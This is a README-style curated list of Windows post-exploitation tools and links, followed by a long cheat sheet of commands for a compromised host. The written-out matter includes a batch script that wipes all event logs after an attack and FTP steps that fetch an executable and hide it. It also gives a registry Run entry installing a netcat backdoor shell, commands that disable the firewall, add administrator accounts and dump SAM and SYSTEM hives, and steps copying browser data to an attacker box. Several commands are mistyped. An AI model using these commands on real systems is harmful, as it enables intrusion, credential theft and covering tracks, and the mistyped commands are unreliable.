# Awesome Windows Post Exploitation 

Your contributions and suggestions are heartily♥ welcome. (✿◕‿◕). Please check the [Contributing Guidelines](CONTRIBUTING.md) for more details. This work is licensed under a [Creative Commons Attribution 4.0 International License](http://creativecommons.org/licenses/by/4.0/).

This repo houses a multitude of articles and tools relating to the post exploitation of Windows machines.  Included is a complete list of commands to use once an OS shell has been established and you're **unable** to use meterpreter for whatever reason. <- You won't find a more definitive list of it's kind.

## Contents

* [Powershell](#powershell)
* [Privilege Escalation Tools](#privilege-escalation-tools)
* [Privilege Escalation Guides/Wiki](#privilege-escalation-guides/wiki)
* [Post Exploitation Tools](#post-exploitation-tools)
* [Post Exploitation Guides/Wiki](#post-exploitation-guides/wiki)
* [Post Exploitation Techniques and Commands](#post-exploitation-techniques-and-commands) *Some of the commands listed are redundant.


## PowerShell

* [BloodHound](https://github.com/adaptivethreat/BloodHound) - Six Degrees of Domain Admin
* [Empire](https://github.com/adaptivethreat/Empire) - Empire is a PowerShell and Python post-exploitation agent
* [Generate-Macro](https://github.com/enigma0x3/Generate-Macro) - Powershell script will generate a malicious Microsoft Office document with a specified payload and persistence method
* [Old-Powershell-payload-Excel-Delivery](https://github.com/enigma0x3/Old-Powershell-payload-Excel-Delivery) - This version touches disk for registry persistence
* [PSRecon](https://github.com/gfoss/PSRecon) - PSRecon gathers data from a remote Windows host using PowerShell (v2 or later), organizes the data into folders, hashes all extracted data, hashes PowerShell and various system properties, and sends the data off to the security team
* [PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite) - Some useful scripts in powershell
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - A PowerShell Post-Exploitation Framework
* [PowerTools](https://github.com/PowerShellEmpire/PowerTools) - A collection of PowerShell projects with a focus on offensive operations
* [Powershell-C2](https://github.com/enigma0x3/Powershell-C2) - A PowerShell script to maintain persistance on a Windows machine
* [Powershell-Payload-Excel-Delivery](https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery) - Uses Invoke-Shellcode to execute a payload and persist on the system
* [mimikittenz](https://github.com/putterpanda/mimikittenz) - A post-exploitation powershell tool for extracting juicy info from memory.
* [Empire](https://github.com/gold1029/Empire) - Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.

## Privilege Escalation Tools

* [Potato](https://github.com/foxglovesec/Potato) - Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012
* [Windows Privilege Excalation](https://github.com/AusJock/Privilege-Escalation/tree/master/Windows) - Contains common local exploits and enumeration scripts
* [Pentest Monkey Windows Privilege Escalation](http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin) - Post-Exploitation in Windows: From Local Admin To Domain Admin (efficiently)
* [Incognito](https://github.com/fdiskyou/incognito2) - Privilege Escalation Tool
* [BeToot](https://github.com/AlessandroZ/BeRoot) - The BeRoot Project finds common misconfigurations that can be leveraged for privilege escalation in Windows, Linux, and OS X environments.

## Privilege Escalation Guides/ Checklists

* [Windows Privilege Escalation](http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation) - Windows Post-exploitation Wiki
* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) - Fundamentals of Windows Privilege Escalation
* [Security Implications of Windows Access Tokens- A Penetration Tester's Guide](https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf) 
* [Checklist - Windows Priviliege Escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) - Best tool to look for Windows local privilege escalation vectors.
* [Windows Privilege Escalation guide](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md) - Very throughal. Def one to check out first.
[Privilege Escalation Windows - OSCP](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html) - Walks you through turning low-privilege shell into privlege shell.

## Post Exploitation Tools

* [mimikatz](https://github.com/gentilkiwi/mimikatz) - A little tool to play with Windows security - extract plaintexts passwords, hash, PIN code and kerberos tickets from memory.
* [Pazuzu](https://github.com/BorjaMerino/Pazuzu) - Reflective DLL to run binaries from memory
* [UACME](https://github.com/hfiref0x/UACME) - Defeating Windows User Account Control
* [Pupy](https://github.com/n1nj4sec/pupy) - Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python.
* [Veil Pillage](https://github.com/Veil-Framework/Veil-Pillage) - Veil-Pillage is a post-exploitation framework that integrates with Veil-Evasion.
* [Intersect](https://github.com/deadbits/Intersect-2.5) - Post exploitation framework.
* [Koadic](https://github.com/zerosum0x0/koadic) - Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.
* [Invoke-AltDSBackdoor](https://github.com/enigma0x3/Invoke-AltDSBackdoor) - This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by using two Alternate Data Streams
* [hackarmoury](http://hackarmoury.com) - Upload common tools from shell of compromised machine via FTP and other protocols.   
* [Invoke-LoginPrompt](https://github.com/enigma0x3/Invoke-LoginPrompt) - Invokes a Windows Security Login Prompt and outputs the clear text password
* [PowerHub] (https://github.com/AdrianVollmer/PowerHub) - A post exploitation tool based on a web application, focusing on bypassing endpoint protection and application whitelisting.
* [LOLBAS and LLOLBAS] (https://github.com/LOLBAS-Project/LOLBAS) (https://github.com/AZSERG/LLOLBAS) - The LOLBAS Project helps you to search for possible privilege escalation paths on your machine whereas LLOLBAS allows you to tailor those paths to the specific machine. With these two tools combined, you are (almost) unstoppable on an engagement. And as an added benefit, it’s convenient to have offline tools available if a situation arises that demands them.




## Post Exploitation Guides/Wikis

* [Post Exploitation Wiki](https://github.com/mubix/post-exploitation-wiki) - Post exploitation wiki.
* [Privlege escalation with Incognito](http://hardsec.net/post-exploitation-with-incognito/?lang=enPE%20with%20Incognito%C2%A0PE%20with%20Incognito) - How to use Incognito for Privilege Escalation in Windows
* [Pwning Windows Domains from the Command Line](https://crowdshield.com/blog.php?name=pwning-windows-domains-from-the-command-line) - Several tools and techniques that can be used in order to compromise an entire Active Directory domain completely from the command line.
* [Windows Post Exploitation Checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
* [pwnwiki](http://pwnwiki.io) - Post Exploitation Wiki (Multi-Platform)
* [Windows Domain: Pivot and Profit](http://www.fuzzysecurity.com/tutorials/25.html) - Techniques to move laterally when compromising a Windows machine.

## Post-exploitation Techniques and Commands

* [Useful Commands for Windows Administrators](http://www.robvanderwoude.com/ntadmincommands.php) - Post-exploitation techniques and commands to elicit information from shell of compromised windows machine.
* [A-Z List of Windows Shell Commands](https://ss64.com/nt/) - A-Z Listing of all Windows CMD Commands
* [Red Team Field Manual](https://github.com/Agahlot/RTFM/blob/master/rtfm-red-team-field-manual.pdf) - Windows Post-Exploitation techniques and commands.
* [Windows & Active Directory Exploitation Cheat Sheet and Command Reference](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/) - Name says it all

### Clear Log Files
A simple script to clear logs post attack.

**Create a batch file and execute it as admin.**

  @echo off
  FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
  IF (%adminTest%)==(Access) goto noAdmin
  for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
  echo.
  echo goto theEnd
  :do_clear
  echo clearing %1
  wevtutil.exe cl %1
  goto :eof
  :noAdmin
  exit
  
### Transfer files to compromised host via non-interactive shell 

In cases where you want to upload a file onto the compromised machine but you don't have an interactive shell where you simply upload the file, you can write it onto the compromised machine using FTP, feeding it one line at a time.  

**Create a blank file to write commands onto**
ftp -s:ftp_commands.txt

**Echo each command (you can also do this all in one line):**

echo open 10.9.122.8>ftp_commands.txt
echo anonymous>ftp_commands.txt
echo blah>ftp_commands.txt
echo binary>ftp_commands.txt
echo get met8888.exe>ftp_commands.txt
echo bye>ftp_commands.txt

*Instead of ftp_commands.txt, use a unique name, hide the file in a datastream, or hide the file in the folder. aka don't be obvi

### Query state of Firewall, Disable Firewall, Allow a Service Through

**Query state of firewall**:

netsh firewall show state

**Disable firewall**

netsh.exe firewall set opmode mode=disable profile=all

**Allow service through firewall**

netsh.exe firewall set portopening tcp 123 MYSERVICE enable all

netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe

HKLM\\software\\microsoft\\windows\\ currentversion\\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat

netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE


**Query current user and privilege information**

whoami

whoami /all

whoami /user

whoami /groups

whoami /priv

**[Users]**

net users: list users

**For more info on a user**:

net user <username> (for local user)
  
net user <username> /domain (for a domain user)

**View domain admins**:

net group "Domain Admins" /domain

**View name of domain controller**:

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC
  
**Add user**:

net users <username> <password> /add

**Add user to local administrators group**:

net localgroup administrators <username> /add

**Delete a user**:

net users username /delete /domain

**Change user's password**:

net users <username> <new_password>


**[Accounts & Groups]**

net accounts

net accounts /domain

net logalgroup administrators

net localgroup administrators /dmain

net group "domain Admins" /domain

net group "Enterprise Admins" /domain

net view /localgroup

net localgroup Administrators

net localgroup /Domain

gpresult: view group policy

gupdate: update group policy

gpresult /z

**[Network and misc information]**

systeminfo:  lists information about system

ipconfig/all: Query ip configuation

ipconfig /displaydns

route print: Prints machines routing table

arp -a: Lists all systems current in the machine's ARP table

nslookup: Query server information

nbtstat: Displays protocol stats and current TCP/IP connections using NetBIOS over TCP/IP

qwinsta: Query info about RDP sessions

net session: Query session information

net time \\computername (Shows the time of target computer)

net share: view shared resources on network



**[Query current drives on system]**

fsutil fsinfo drives


**[Grab SAM and SYSTEM files]**

type "C:/windows/repair/SAM"

type "C:/windows/repair/SYSTEM"


**[Tasks]**

tasklist /svc: lists running processes

taskkill /PID <process ID> /F : forcibly kill task
  
taskkill taskkill /PID xxx taskkill /IM name* of process to be terminated * can be used to kill all processes with same name

tasklist /V /S computername: Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount

qprocess*: Similar to tasklist but easier to read

at: Query current scheduled tasks

schtasks: Query scheduled tasks that your current user has access to see.

schtasks /query /fo csv /v > %TEMP%


**[Netstat]**

netstat -ano : to see what services are running on what ports

netstat -bano

netstat -r

netstat -na | findstr :443


**[Query information about server and workstation, Workstation domain name and Logon domain]**

net config server

net config workstation



**[Change drive to different drive letter]**

ex change to D:/ directory and list it's contents:

d: & dir

cd /d d: & dir

dir \\computername\share_or_admin_share\ (dir list a remote directory)

**[Cat contents of file located in D:/ directory]**

cd /d & type d:\blah\blah


**[net view]**

net view /domain[:DomainName]

net view \\computerName


**[Services]**

**View list processes started upon startup**

net start

wmic startup get caption,command


**[Query, Stop/Start/Pause Installed Services]**

sc query state= all

sc query <service>
  
sc <stop> <service>


**[Remote System Access]**

reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

net share \\computername

tasklist /V /S computername

qwinsta /SERVER:computername

qprocess /SERVER:computername 



**[WMI]*

wmic bios

wmic qfe

wmic qfe get hotfixid (This gets patches IDs)

wmic startup

wmic service

wmic os

wmic process get caption,executablepath,commandline

wmic process call create “process_name” (executes a program)

wmic process where name=”process_name” call terminate (terminates program)

wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)

wmic useraccount (usernames, sid, and various security related goodies)

wmic useraccount get /ALL

wmic share get /ALL (you can use ? for gets help ! )

wmic startup list full (this can be a huge list!!!) 

wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)


**[Reg Command]**

reg save HKLM\Security security.hive (Save security hive to a file)

reg save HKLM\System system.hive (Save system hive to a file)

reg save HKLM\SAM sam.hive (Save sam to a file)=

reg add [\\TargetIPaddr\] [RegDomain][ \Key ]

reg export [RegDomain]\[Key] [FileName]

reg import [FileName ]

reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )


**[Deleting Logs]**

wevtutil el (list logs)

wevtutil cl


**[Uninstalling Software]**

wmic proud get name /value: gets software names

wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software



**[Permissions]**

icacls

Grant full access over directory and encompassing folders and files:

icacls "C:\windows" /grant Administrator:F /T

icacls "C:\" /grant "nt authority\system": F /T


**[Net use]**

net use: Map network shares

net use \\computername (maps IPC$ which does not show up as a drive)

net use \\computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)

**[Mount a remote share with the rights of the current user]**:

net use K: \\<ip>\<share>
  
dir K:

**[Enable remote desktop]**

reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f

net session: list session information

**[Other useful Commands]**

pkgmgr usefull /iu :"Package"

pkgmgr usefull /iu :"TellnetServer": install telnet service

pkgmgr /iu:"TelnetClient"

rundll32.exe user32.dll, LockWorkStation: locks the screen

wscript.exe <script js/vbs>

cscript.exe <script js/vbs/c#>

xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box

type "C:\documents and settings\administrator\userdata\index.dat"

type %WINDIR%\System32\drivers\etc\hosts: view contents of hosts files

type "c:\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Credentials"

cd "C:/Documents and settings\administrator\userdata" & dir

type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"

type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"

type "C:\documents and settings\administrator\userdata\index.dat"
